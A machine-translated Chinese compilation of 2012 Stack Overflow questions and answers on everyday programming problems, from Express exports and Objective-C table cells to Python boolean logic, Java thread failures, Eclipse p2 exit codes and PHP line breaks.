## 回答 #1

> 赞同：77
> 
> 时间：2012-08-13T02:56:19.433

您需要将`app`对象导出到`server.js`：

```
var app = express();

module.exports = app;

... 
```

# iphone - 如何将单元格添加到表格视图中

> ID：11927198
> 
> 赞同：0
> 
> 时间：2012-08-13T01:20:52.757
> 
> 标签：iphone, objective-c, ios, uitableview, xcode4.3

是否可以将 2 添加`cell.textlabel`到表格视图中。因为我想尝试显示 3 条不同的线。这是我做的代码：

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

static NSString *CellIdentifier = @"Cell";
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
if (cell == nil) {
    cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier] autorelease];
}
cell.textLabel.font = [UIFont systemFontOfSize:14]; //Change this value to adjust size
cell.textLabel.numberOfLines = 2;
cell.textLabel.text = [NSString stringWithFormat:@"%@ %@","Walk to and board at ",[boardDescArray objectAtIndex:indexPath.row]]; 
cell.textLabel.text = [NSString stringWithFormat:@"%@ %@","Alight Destination = ",[alDescArray objectAtIndex:indexPath.row]]; 
return cell;
} 
```

但是当我放两个`cell.textLabel.text`时它出错了`bad access`。我该怎么办？请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T01:26:06.500

您只调用一次 cell.textLabel.text ，但在您想要换行的字符串中放置一个 \n 。

您的 stringWithFormat 中也有一个错误——要么在“Walk to and board at”前面放一个@，要么只删除第一个 %@，然后：

stringWithFormat:@"步行到 %@ 并登机",[boardDescArray objectAtIndex:indexPath.row]];

因此，要使其成为您想要的 2 行：

```
cell.textLabel.text = [NSString stringWithFormat:@"Walk to and board at %@\nAlight Destination = %@",[boardDescArray objectAtIndex:indexPath.row],[alDescArray objectAtIndex:indexPath.row]]; 
```

# ruby-on-rails - 女工协会

> ID：11927211
> 
> 赞同：0
> 
> 时间：2012-08-13T01:23:25.873
> 
> 标签：ruby-on-rails, rspec

我有一个广告工厂，但如何将其分配给 user.ads 属性？我试过了

```
@ad = user.ads.build(:ad) 
```

但这对我不起作用

```
FactoryGirl.define do
 factory :user do
  name     "My"
  email    "my@example.com"
 end

 factory :ad do
  title "Ola"
  description "Hello"
  user
 end
end

let(:user) { FactoryGirl.create(:user) }
#so i don't type it like this:
@ad = user.ads.build(title: "Lorem ipsum",description: "Lorem ipsum")
subject { @ad } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:32:11.037

```
let(:user) { FactoryGirl.create(:user) }    
5.times { FactoryGirl.create(:ad, user: user) }

user.ads #=> array of ads 
```

`User`当然，只有在和`Ad`模型中适当地设置关联时，它才会起作用。

# c# - 红外探测器 USB POLL

> ID：11927221
> 
> 赞同：1
> 
> 时间：2012-08-13T01:25:39.900
> 
> 标签：c#, c++, usb

我的目标是使用 c++/c# 来轮询 USB 端口以查看电源是否从外流向内。

我有一个红外探测器 LED 连接到 USB 输出，然后返回到输入。我基本上想知道我怎么能做这样的事情：

```
USBDevice usb = LoadUSBDevice(port1);
boolean detected = usb:isPowerFlowingOutToIn();
if(detected){
     double amount = usb:getVoltage();
     if(amount > somenumber){
           //do stuff
     }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T08:26:25.060

此设置无法按原样工作。USB 设备必须根据 USB 规范做出响应，否则它们将无法获得分配的地址。由于您的设备行为不正常（例如，它无法建立供应商 ID、产品 ID、设备类别……）它不会获得地址。因此，假设是`LoadUSBDevice(port1);`行不通的。

Raymond Chen 将其很好地总结为“fork 也是一种非标准 USB 设备”。Windows USB 驱动程序是相当宽容的，但是当插入 USB 端口时，您不能期望任何东西都能正常工作。

# python - python字符串和C字符数组的相似之处

> ID：11927222
> 
> 赞同：3
> 
> 时间：2012-08-13T01:25:54.217
> 
> 标签：python, c

我试图在 python 字符串和 C 字符数组分配给字符串文字之间建立联系。例如：

```
char* word="Hello";
        word="Now"; 
```

分配给放置在只读存储器位置的字符串“Hello”。现在将单词重新分配给“Now”意味着现在为字符数组分配了一个与“Now”相对应的内存位置。

在 python 中，偶数（显然是字符串）似乎像这样工作，分配一个值为 2 的内存位置，然后重新分配一个值为 3 的内存位置。

```
 a=2
 a=3 
```

这与 C 形成对比，C 中几乎所有的变量赋值，变量都包含它被赋值的值。我在这里做一个很好的比较吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T01:46:49.423

在 C 中，`char *`是类型“指向字符的指针”。指针就像一个“句柄”，可以让您访问值本身。当您分配时`word = "Now";`，您正在更改句柄，而不是字符串的字符。两者`"Hello"`仍然`"Now"`以字节组的形式存在于常量存储中。

Python 隐藏了更多它正在做的事情，但在内部，它的内置字符串引用本质上就像指针一样。所以你的观察在一定程度上是正确的。

这些语言的字符串的最大区别在于，在 Python 中，所有字符串都是不可变的。C 允许您在（非常量）字符串中操作（通过赋值）字符。例如：

```
char word [] = "Hello";
// word is now the name of a 6-character (including final null) mutable string
word[0] = 'h';
// Now word has the value "hello". 
```

在 Python 中，您必须创建一个全新的字符串：

```
word = 'h' + word[1:] 
```

这里构成新字符串的字节与`word`.

没错，Python 具有“引用语义”。一切都表现得好像您正在操纵一个句柄而不是一个值。

```
>>> a=[1]
>>> b=a
>>> a
[1]
>>> b
[1]
>>> a[0]=5
>>> a
[5]
>>> b
[5] 
```

这里的分配`b = a`复制了一个句柄或对列表的引用。列表本身不会被复制。这很明显，因为改变的第一个元素`a`也改变了`b`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T01:39:50.127

char * 表示 word 是一个指针变量。字符串的地址放在变量中，字符串中的字符不动。对于 C，所有赋值都将一个值移动到变量中，而不是几乎所有。在这种情况下，地址是被移动的值。

Python 稍微复杂一些。它将变量绑定到可能导致其他操作在幕后发生的值，例如释放旧值。

# .htaccess - 如何将 Drupal 7 中文件的访问权限仅限于经过身份验证的用户

> ID：11927223
> 
> 赞同：0
> 
> 时间：2012-08-13T01:26:02.633
> 
> 标签：.htaccess, drupal-7

我正在寻找一种解决方案来在 D7 中创建文件列表，但只允许经过身份验证的用户查看（和下载）它们。

这样，只有我作为管理员添加的用户才能查看文件列表并下载它们。

在搜索时，我发现了对名为 content_access 的模块的引用，但它在过去一年中没有看到任何更新。

任何有参考或想法的人？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T05:02:39.110

**上传和存储**

启用和使用私有文件存储。*[以下摘录的完整文档...](http://drupal.org/documentation/modules/file)*

> 默认情况下，上传目标只有公共文件选项可用——使文件可以直接从服务器获得（无需 Drupal 检查任何访问）。如果要使用私有文件，必须首先在文件系统管理页面（管理 > 配置 > 媒体：文件系统）更改一些设置。详情见下文。

使用私有文件存储时会有额外的开销，但这应该可以完成您需要的工作。

![私有文件存储设置](../Images/a4f6e5efcd2058966b86cfa3ac378d0d.png)

* * *

**列出和下载**

要生成可下载文件的受保护列表，您可以使用[Views](http://drupal.org/project/views/)模块。

[安装并启用视图](http://drupal.org/project/views/)模块后，访问站点管理 -> 结构 -> 视图 -> 添加新视图 ( `admin/structure/views/add`)

在不涉及太多[视图](http://drupal.org/project/views/)细节的情况下，使用与下面的屏幕截图类似的配置。

![视图配置](../Images/69bfa68e517fa9842b7745c5ba341994.png)

# asp.net - IIS 权限：“所有人”都有效，但 IIS DefaultAppPool 无效？

> ID：11927226
> 
> 赞同：0
> 
> 时间：2012-08-13T01:26:26.190
> 
> 标签：asp.net, permissions, iis-7.5

我收到一条错误消息，指出找不到 Site.master。将文件夹的权限更改为“所有人”，问题已解决。当然，我不想这样，所以我查找了解决问题的正确方法并（在删除“所有人”之后）添加了“IIS AppPool\DefaultAppPool”。

现在我得到的只是页面标签中的一个旋转图标。它只是无限旋转。至少在它给我一个有意义的错误之前，但现在它只是坐在那里，甚至从不超时或除了旋转之外做任何事情。

什么是交易？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:58:41.557

原来这是一个 ID10T 错误。我连接了调试器，但我忘记了它在断点处停止。

# javascript - JavaScript 将日期转换为格式

> ID：11927231
> 
> 赞同：2
> 
> 时间：2012-08-13T01:27:27.197
> 
> 标签：javascript, date

我正在尝试从以下位置截断 JavaScript Date 对象字符串：

```
Wed Aug 01 2012 06:00:00 GMT-0700 (Pacific Daylight Time) 
```

到

```
Wed Aug 01 2012 
```

（我并不特别，`MM/DD/YYYY`例如可以是格式，只要我摆脱时间/时区）

本质上我只想摆脱时间和时区，因为我需要`===`与另一个日期进行比较（不包括时间或时区）

我试过使用这个[http://www.mattkruse.com/javascript/date/index.html](http://www.mattkruse.com/javascript/date/index.html)但它无济于事。有谁知道我如何格式化现有字符串以摆脱时间？我宁愿远离`substring`功能，但如果这是唯一的选择，那么我想我将不得不解决。

**编辑：**我愿意接受比较两个日期对象/字符串并`true`在日期相同且时间不同时返回的选项。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T03:05:59.017

在不同浏览器中获取特定日期格式的唯一**方法是自己创建。**ECMAScript 中的 Date 方法都依赖于实现。

如果你有一个日期对象，那么：

```
// For format Wed Aug 01 2012
function formatDate(obj) {
  var days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
  var months = ['Jan','Feb','Mar','Apr','May','Jun',
               'Jul','Aug','Sep','Oct','Nov','Dec'];    
  return days[obj.getDay()] + ' ' + months[obj.getMonth()] + 
         ' ' + obj.getDate() + ' ' + obj.getFullYear();
} 
```

虽然更广泛使用的格式是 Wed 01 Aug 2012

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T02:02:47.880

使用`Date`对象的[toDateString()](http://www.w3schools.com/jsref/jsref_todatestring.asp)方法而不是其[toString()](http://www.w3schools.com/jsref/jsref_tostring_date.asp)方法。

[**并排演示**](http://jsfiddle.net/Snowsickle/A6d8C/)

即便如此，直接比较两个日期对象可能会更好： [Compare two dates with JavaScript](https://stackoverflow.com/questions/492994/compare-2-dates-with-javascript)

# ios - 如何使用 iOS GoogleDrive SDK 在流媒体中播放视频？

> ID：11927232
> 
> 赞同：3
> 
> 时间：2012-08-13T01:27:40.017
> 
> 标签：ios, youtube, google-drive-api

我想使用 iOS GoogleDrive SDK 在流媒体中播放视频。iOS 应用商店中的 GoogleDrive App 可以通过 YouTube 流式播放视频。

我看过这个帖子： [http](http://apiblog.youtube.com/2009/02/youtube-apis-iphone-cool-mobile-apps.html) ://apiblog.youtube.com/2009/02/youtube-apis-iphone-cool-mobile-apps.html 根据帖子，播放视频的关键是YouTube源链接。

该链接列出了 GoogleDrive 的所有文件属性： [https ://developers.google.com/drive/v2/reference/files](https://developers.google.com/drive/v2/reference/files)

尝试了所有文件的属性而不是 YouTube 源链接，但这不起作用。谁能告诉我如何获得正确的链接以通过 YouTube 播放视频？

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T14:31:31.807

您可以通过该`embedLink`字段中的 URL 来获取视频的流媒体播放器。

# jquery - 可以嵌入网站中用作在线绘图工具的绘图/素描小部件

> ID：11927234
> 
> 赞同：7
> 
> 时间：2012-08-13T01:28:03.470
> 
> 标签：jquery, flash, html, canvas, drawing

我正在寻找以 Java、Flash、HTML5 和 JAVASCRIPT 或任何其他方式编写的非商业或商业在线小部件/工具，它提供以下功能：

*   可以嵌入网站中（如 java applet、flash 或 javascript div，..）
*   具有主要的绘图或图像编辑工具，例如（笔、橡皮擦、颜色选择等）
*   具有保存功能，可将作品保存为 JPEG 或 PNG 或其他有用的格式

我已经搜索和搜索，发现只有[http://www.mainada.net/inputdraw/](http://www.mainada.net/inputdraw/)似乎有非常有限的工具。

有些网站有画布（photoshop.com 或[http://muro.deviantart.com/](http://muro.deviantart.com/)），但据我所知，不可能嵌入这些画布并让它们加载/保存特定文件！

任何形式的帮助表示赞赏！:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-25T14:27:53.267

SVG 编辑

[https://code.google.com/p/svg-edit/](https://code.google.com/p/svg-edit/)

具有基本形状、线条、贝塞尔曲线、多段。上面的页面有指向沙盒的链接，您可以在其中玩。

供您使用的网络工具。

[http://webtools4u2use.wikispaces.com/Drawing,+Charting+%26+Mapping+Tools](http://webtools4u2use.wikispaces.com/Drawing,+Charting+%26+Mapping+Tools)

广泛的项目列表，大部分没有用，但值得一看。

学校使用的酷工具

[http://cooltoolsforschools.wikispaces.com/Drawing+Tools](http://cooltoolsforschools.wikispaces.com/Drawing+Tools)

另一个要检查的事情清单。大多数都过于专业化，能力有限。

[http://www.jswidget.com/index-ipaint.html](http://www.jswidget.com/index-ipaint.html)

这是一个典型的绘画程序——你不能编辑你刚刚画的东西，除非用撤消键。

我建议从 SVG 编辑代码开始。对象保存在矢量空间中，因此可以重新编辑。

# python - 调用了错误的函数？

> ID：11927237
> 
> 赞同：2
> 
> 时间：2012-08-13T01:28:36.367
> 
> 标签：python, python-3.x

所以我用 Python 写了一个简短的聊天机器人，但是有一个恼人的问题。`posResponses()` 程序最初只会调用该函数。

在上下文中，如果我用“悲伤”、“可怕”甚至“asdfasdfasdf”来回答它最初的问题，我仍然会得到积极的回应。

应该发生的是，如果我输入一个否定/模棱两可的关键字，应该调用`negResponses()`/函数。`ambiguousResponses()`事实并非如此。我做错了什么，我该如何解决？代码如下：

```
import random
import time

def opening():
    print('Hello!')

def responseType():
    responseType = str(input('How are you ?'))
    if responseType == 'good' or 'great' or 'fantastic' or 'decent' or 'fine' or 'ok' or 'okay': posResponses()
    elif responseType == 'bad' or 'terrible' or 'sad' or 'grumpy' or 'angry' or 'irritated' or 'tired': negResponses()
    else: ambiguousResponses()

def posResponses():
    number = random.randint(1, 4)
    if number == 1:
        print('That\'s great! So what\'s up?')
        input()
        ambiguousResponses()
    if number == 2:
        print('Really? I\'d like to hear more.')
        input()
        ambiguousResponses()        
    if number == 3:
        print('I\'m glad to hear that. What\'s going on?')
        input()
        ambiguousResponses()        
    if number == 4:
        print('Ah, me too. You should begin a topic discussion.')
        input()
        ambiguousResponses()        

def negResponses():
    number2 = random.randint(5, 8)
    if number2 == 5:
        print('That\'s really too bad. Care to elaborate?')
        input()
        ambiguousResponses()
    if number2 == 6:
        print('Awww. Why?')
        input()
        ambiguousResponses()
    if number2 == 7:
        print('That sucks! How come?')
        input()
        ambiguousResponses()
    if number2 == 8:
        print('What a shame! You should explain why.')
        input()
        ambiguousResponses()

def ambiguousResponses():
    number = random.randint(1, 4)
    if number == 1:
        print('Interesting. Carry on.')
        input()
        ambiguousResponses()
    if number == 2:
        print('Wow, elaborate!')
        input()
        ambiguousResponses()
    if number == 3:
        print('What an astute remark! Continue.')
        input()
        ambiguousResponses()
    if number == 4:
        print('How interesting. Please do explain further.')
        input()
        ambiguousResponses()

if __name__ == "__main__":
    opening()
    responseType() 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T01:32:14.640

Python 是这样解析的：

```
if (responseType == 'good') or 'great' or 'fantastic' or 'decent' or 'fine' or 'ok' or 'okay': posResponses()
elif (responseType == 'bad') or 'terrible' or 'sad' or 'grumpy' or 'angry' or 'irritated' or 'tired': negResponses()
else: ambiguousResponses() 
```

`'great'`是一个真值，所以这个`if`语句总是成功的。你可能想像这样重写它：

```
if responseType == 'good' or responseType == 'great' or responseType == 'fantastic' or responseType == 'decent' or responseType == 'fine' or responseType == 'ok' or responseType == 'okay':
    posResponses()
elif responseType == 'bad' or responseType == 'terrible' or responseType == 'sad' or responseType == 'grumpy' or responseType == 'angry' or responseType == 'irritated' or responseType == 'tired':
    negResponses()
else:
    ambiguousResponses() 
```

或者，最好：

```
if responseType in {'good', 'great', 'fantastic', 'decent', 'fine', 'ok', 'okay'}:
    posResponses()
elif responseType in {'bad', 'terrible', 'sad', 'grumpy', 'angry', 'irritated', 'tired'}:
    negResponses() 
```

您甚至可以将这些响应移动到一个常量中：

```
# near the top of the file:
GOOD_RESPONSES = {'good', 'great', 'fantastic', 'decent', 'fine', 'ok', 'okay'}
BAD_RESPONSES = {'bad', 'terrible', 'sad', 'grumpy', 'angry', 'irritated', 'tired'}

# when you need to judge a response:
if responseType in GOOD_RESPONSES:
    posResponses()
elif responseType in BAD_RESPONSES:
    negResponses()
else:
    ambiguousResponses() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T03:17:19.880

`posResponses`只被调用一次，因为在 posResponses 中你调用了 ambiguousResponses，而在 ambiguousResponses 中你调用了 ambiguousResponses。所以它永远不会退出 ambiguousResponses，它只会继续调用 ambiguousResponses 直到你用完堆栈并且程序崩溃。

你试图让这个程序递归。不应该，应该有一个以 input() 调用为中心的循环，整个程序中只需要一个循环，而不是 15 或任何你现在拥有的循环。

但比这更明显的错误是，您对响应是正面还是负面的测试不包括在递归中，因此程序只检查一次输出的响应。

# javascript - 替换 url 中的所有 '-'

> ID：11927241
> 
> 赞同：1
> 
> 时间：2012-08-13T01:29:24.050
> 
> 标签：javascript

我的代码现在只用空格替换第一个`-`，但是 url 中有多个`-`，我如何用空格替换所有？

```
window.location.hash.substring(1).replace('-', ' '); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T01:31:26.483

尝试：

```
window.location.hash.substring(1).replace(/-/g, ' ') 
```

g -> 所有实例

# ios - iCloud保存数据与UIDocument崩溃

> ID：11927247
> 
> 赞同：3
> 
> 时间：2012-08-13T01:31:03.920
> 
> 标签：ios, icloud, uidocument

我正在尝试使用 iCloud 来存储我的应用程序的 userSetting，这是我的 Save & Load Code: ，它通常运行良好，但有时会崩溃并显示如下消息：**尝试打开或恢复已经在运行中打开或恢复操作的文档**或**发送到 dealloc 实例**，所以我在 openWithCompletionHandler 之前添加 fileState 日志，无论是否崩溃，它总是显示 state = UIDocumentStateClosed，我在 applecationDidEnterBackground 时保存数据并在 applicationDidBecomeActive 时加载。

节省：

```
-(void)storeToiCloud{
    NSURL *baseURL = [[NSFileManager defaultManager] URLForUbiquityContainerIdentifier:nil];
    if (baseURL) {
        NSURL *documentsURL = [baseURL URLByAppendingPathComponent:@"Documents"];
        NSURL *documentURL = [documentsURL URLByAppendingPathComponent:[NSString stringWithFormat:@"userSetting"]];
        if (!loadDocument) {
            self.loadDocument = [[MyUserDefaultsDocument alloc] initWithFileURL:documentURL];
        }
        loadDocument.myUserDefault = [MyUserDefaults standardUserDefaults];

        [loadDocument saveToURL:documentURL forSaveOperation:UIDocumentSaveForCreating completionHandler:^(BOOL success) {
        }];
    }
} 
```

加载：

```
-(BOOL)shouldSynciCloud{
    if (![Utility iCloudEnable]) {
        return NO;
    }
    NSURL *baseURL = [[NSFileManager defaultManager] URLForUbiquityContainerIdentifier:nil];
    if (baseURL) {
        self.query = [[[NSMetadataQuery alloc] init] autorelease];
        [self.query setSearchScopes:[NSArray arrayWithObject:NSMetadataQueryUbiquitousDocumentsScope]];
        NSPredicate *predicate = [NSPredicate predicateWithFormat:@"%K == 'userSetting'", NSMetadataItemFSNameKey];
        [self.query setPredicate:predicate];

        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        [nc addObserver:self selector:@selector(queryDidFinish:) name:NSMetadataQueryDidFinishGatheringNotification object:self.query];

        [self.query startQuery];
        [Utility showSpinner];
        return YES;
    }
    return NO;
}

- (void)queryDidFinish:(NSNotification *)notification {
    NSMetadataQuery *query = [notification object];

    // Stop Updates
    [query disableUpdates];
    // Stop Query
    [query stopQuery];
    [query.results enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {

        NSURL *documentURL = [(NSMetadataItem *)obj valueForAttribute:NSMetadataItemURLKey];

        if([[documentURL lastPathComponent] hasPrefix:@"userSetting"]){
            self.document = [[MyUserDefaultsDocument alloc] initWithFileURL:documentURL];
            NSString* message;
            if (document.documentState == UIDocumentStateNormal){
                message = @"UIDocumentStateNormal";
            }else if (document.documentState == UIDocumentStateClosed) {
                message = @"UIDocumentStateClosed";
            }else if(document.documentState == UIDocumentStateEditingDisabled){
                message = @"UIDocumentStateEditingDisabled";
            }else if(document.documentState == UIDocumentStateInConflict){
                message = @"UIDocumentStateInConflict";
            }else if(document.documentState == UIDocumentStateSavingError){
                message = @"UIDocumentStateSavingError";
            }
            NSLog(@"state = %@",message);
            [document openWithCompletionHandler:^(BOOL success) {
                if (success) {
                    MyUserDefaults *prefs = [MyUserDefaults standardUserDefaults];                    
                    NSData *book =[document.myUserDefault.realDict objectForKey:@"realbook"];
                    NSData *readSetting = [document.myUserDefault.realDict objectForKey:@"epubRS"];

                    if (book&&[[NSUserDefaults standardUserDefaults] boolForKey:@"iCloudBook"]) {
                        [prefs setObject:book forKey:@"realbook"];
                        [Utility reloadRealBooks];
                    }
                    if (readSetting&&[[NSUserDefaults standardUserDefaults] boolForKey:@"iCloudSetting"]) {
                        [prefs setObject:readSetting forKey:@"epubRS"];
                        [Utility setEpubReadSettingFromData:readSetting];
                    }
                    [prefs save];

                    [[NSNotificationCenter defaultCenter]postNotificationName:@"iCloudSynced" object:nil];
                    [Utility removeSpinner];
                }
                else{
                    [[NSNotificationCenter defaultCenter]postNotificationName:@"iCloudSyncfailed" object:nil];
                    [Utility removeSpinner];
                }
            }];
        }
    }];
    if ([query.results count]==0) {
        [[NSNotificationCenter defaultCenter]postNotificationName:@"iCloudSyncfailed" object:nil];
        [Utility removeSpinner];
    }
    [[NSNotificationCenter defaultCenter] removeObserver:self name:NSMetadataQueryDidFinishGatheringNotification object:nil];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T20:09:45.090

如[本问题](https://stackoverflow.com/questions/11933055/uidocument-openwithcompletionhandler-crash)所述，如果您的应用程序尝试连续两次调用 [document openWithCompletionHandler:] 方法，则会发生错误。

因为 openWithCompletionHandler: 是异步打开文档的，所以当再次调用该方法时，文档可能还在打开中。

如果发生这种情况，您的应用程序最终会尝试打开文档两次（因为文档状态将保持 UIDocumentStateClosed 直到完成），这会导致引发异常。

# java - Java 线程无异常停止

> ID：11927248
> 
> 赞同：11
> 
> 时间：2012-08-13T01:31:05.733
> 
> 标签：java, multithreading

当我为我的程序使用 4 个线程时，通常没有问题，但今天我将它增加到 8 个，我注意到 1-3 个线程停止工作而没有抛出任何异常。有没有办法找出他们停下来的原因？反正有没有让线程重新启动？

这就是我的线程的结构

```
public void run()
{
  Main.logger.info(threadName + ": New Thread started (inside run)");
  while (true)
  {
    try
    {
      //all my code
      //all my code
      //all my code
    }
    catch(Exception e)
    {
      Main.logger.error("Exception: " + e);
      try
      {
        Thread.sleep(10000);
      }
      catch (InterruptedException e1)
      {
        e1.printStackTrace();
      }
    }
    finally
    {               
      try
      {
        webClient.closeAllWindows();
        Thread.sleep(3000); 
        Main.logger.info(threadName + ": Closed browser!");
      }
      catch (Exception e)
      {
        Main.logger.error("Exception: " + e);
      }
    }  
  }// end while
} 
```

问候！

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-08-13T02:14:56.713

注意an[`Error`](http://docs.oracle.com/javase/6/docs/api/java/lang/Error.html)不是; **_** [`Exception`](http://docs.oracle.com/javase/6/docs/api/java/lang/Exception.html)这是一个[`Throwable`](http://docs.oracle.com/javase/6/docs/api/java/lang/Throwable.html)。
所以，如果你`catch Exception`，`Errors`仍然会通过：

```
private void m() {    
    try {
        m(); // recursively calling m() will throw a StackOverflowError
    } catch (Exception e) {
        // this block won't get executed, 
        // because StackOverflowError is not an Exception!
    }
} 
```

要捕捉“一切”，请将您的代码更改为：

```
try {
    ...
} catch (Throwable e) {
   // this block will execute when anything "bad" happens
} 
```

请注意，如果发生错误，您可能无能为力。错误的 javadoc 摘录：

> Error 是 Throwable 的子类，表示合理的应用程序不应尝试捕获的严重问题。大多数此类错误是异常情况。ThreadDeath 错误虽然是“正常”情况，但也是 Error 的子类，因为大多数应用程序不应该尝试捕获它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T01:39:16.463

> 有没有办法找出他们停下来的原因？

这有点棘手。

Java 线程可能因两个原因而终止：

*   它可以从它的`run()`方法返回，
*   它可以由于抛出异常而不是在线程的堆栈中捕获而终止。

`run()`您可以通过对线程使用“UncaughtExceptionHandler”来检测后一种情况，但除非您修改线程的方法以记录事件......或类似的东西，否则无法肯定地检测到前一种情况。

我想，弄清楚发生了什么的另一种方法是将调试器附加到 JVM 并让它向您报告未捕获的异常。

（我怀疑您没有看到任何异常的原因是您的线程的`run`方法没有捕获/记录所有异常，并且它们没有未捕获的异常处理程序。）

> 反正有没有让线程重新启动？

不，没有办法重新启动已终止的线程。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T01:38:38.363

如果您从命令行运行，您可以将所有线程的状态转储到控制台。在 Windows 上，您可以通过在 linux 下按 Ctrl+Break 来执行此操作，方法是使用 'kill' 向进程发送 QUIT 信号。

请参阅[Java 堆栈跟踪简介](http://java.sun.com/developer/technicalArticles/Programming/Stacktrace/)

> 向 Java 虚拟机发送信号 在 UNIX 平台上，您可以使用 kill 命令向程序发送信号。这是退出信号，由 JVM 处理。例如，在 Solaris 上，您可以使用命令 kill -QUIT process_id，其中 process_id 是 Java 程序的进程号。
> 
> 或者，您可以在启动 Java 程序的窗口中输入键序列 \。发送此信号指示 JVM 中的信号处理程序以递归方式打印出有关 JVM 内部线程和监视器的所有信息。
> 
> 要在 Windows 95 或 Windows NT 平台上生成堆栈跟踪，请在运行 Java 程序的窗口中输入键序列，或单击窗口上的关闭按钮。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T02:48:04.807

其中一个的线程优先级可能太高，尝试将它们设置为相同级别吗？如果它们之间存在任何控制，则可能发生死锁。

# android - Android在按钮单击时添加标志

> ID：11927258
> 
> 赞同：0
> 
> 时间：2012-08-13T01:32:31.223
> 
> 标签：android, button, canvas

我有一个按钮，当我单击它时，我想要创建 flag.png 图像并将其放置在画布上的任何位置

这是我的标志按钮代码

```
 // the flag button
    Button flag = (Button) findViewById(R.id.btnFlag1);
    flag.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {
        flag(R.drawable.flag1);
        }
        }); 
```

这是我的功能

```
public void flag(int resourceID) {
    Bitmap flagBitmap = BitmapFactory.decodeResource(
            getResources(), resourceID);
    Canvas c = new Canvas(flagBitmap);
    c.drawBitmap(flagBitmap, null, null);
} 
```

什么都没有发生 atm ..

标志是圆形的，我将它们作为按钮，我想要的是在单击每个按钮时添加它们，它的标志被插入，我可以把它放在我想要的地方

就像任何照片编辑应用程序上的笑脸

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:48:02.530

我不明白为什么您在问题中提到使用图像视图，而您使用的是画布来绘制位图图像。如果您想以 imageview 方式进行操作，这里有一些代码可以帮助您：

```
ImageView pic = (ImageView) findViewById(R.id.imageview);
Bitmap img=BitmapFactory.decodeResource(getResources(),R.drawable.flag1);
pic.setImageBitmap(img); 
```

确保在 xml 文件中声明您的 imageview。如果有任何进一步的问题或我的问题有误，请随时发表评论。

**编辑：**

```
Matrix matrix = new Matrix();
matrix.reset();
matrix.postTranslate(x, y);

pic.setScaleType(ScaleType.MATRIX);
pic.setImageMatrix(matrix); 
```

在要放置标志的位置插入 x 和 y 坐标，而不是 x 和 y。

# eclipse - 日食不返回错误级别

> ID：11927259
> 
> 赞同：3
> 
> 时间：2012-08-13T01:33:22.113
> 
> 标签：eclipse, eclipse-plugin, batch-file, p2

我正在编写一个批处理文件来从本地存储库安装 eclipse 上的功能。

```
eclipse.exe -application org.eclipse.equinox.p2.director
  -repository C:/repo,http://download.eclipse.org/releases/indigo/
  -installIU com.app.feature.feature.group 
```

但我无法从批处理脚本中检测到操作是失败还是成功。看来eclipse没有设置错误级别？任何可能的解决方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T00:21:40.427

我发现的一种解决方法是通过 ant exec 运行命令，而不是直接从批处理文件中调用。它报告所有错误。

```
<exec executable="eclipse.exe" failonerror="true">
  <arg value="-noSplash"/>
  <arg value="-application"/>
  <arg value="org.eclipse.equinox.p2.director"/>
  <arg value="-repository"/>
  <arg value="file:C:/repo,http://download.eclipse.org/releases/indigo/"/>
  <arg value="-installIU"/>
  <arg value="com.app.feature.feature.group"/>
</exec> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T15:18:44.257

Equinox 3.6.0 中有一个[错误](https://bugs.eclipse.org/bugs/show_bug.cgi?id=321386)（在 3.6.1 中已修复）导致失败的应用程序返回退出代码 0。除非您使用的是 Equinox 版本，否则 p2 导向器应用程序具有正确的退出代码。

我想问题在于您如何检查批处理脚本中的退出代码。您可以使用 . 检查非零退出代码`IF ERRORLEVEL 1 GOTO LabelOfErrorHandling`。

# php - 在单独的行上打印数组的内容

> ID：11927260
> 
> 赞同：0
> 
> 时间：2012-08-13T01:33:27.433
> 
> 标签：php, arrays

尝试使用数组并想知道为什么以下内容在我运行时似乎没有在单独的行上打印值？

```
<?php

$my_array = array("stuff1", "stuff2", "stuff3");

echo $my_array[0] . "\n";
echo $my_array[1] . "\n";
echo $my_array[2] . "\n";

?> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T01:39:53.000

这就是诀窍。

```
<?php
    $my_array = array("stuff1", "stuff2", "stuff3");
    foreach ( $my_array as $item ) {
        echo $item . "<br/>";
    }
?> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-07-21T08:53:33.530

如果您在 Web 浏览器中查看输出，[则换行符不会在视觉上表示](https://stackoverflow.com/questions/39325414/line-break-in-html-with-n)。相反，您可以使用 HTML 中断：

```
<?php
    $my_array = array("stuff1", "stuff2", "stuff3");
    echo implode('<br>', $my_array);
?> 
```

* * *

## 回答 #3

> 赞同：2
> 
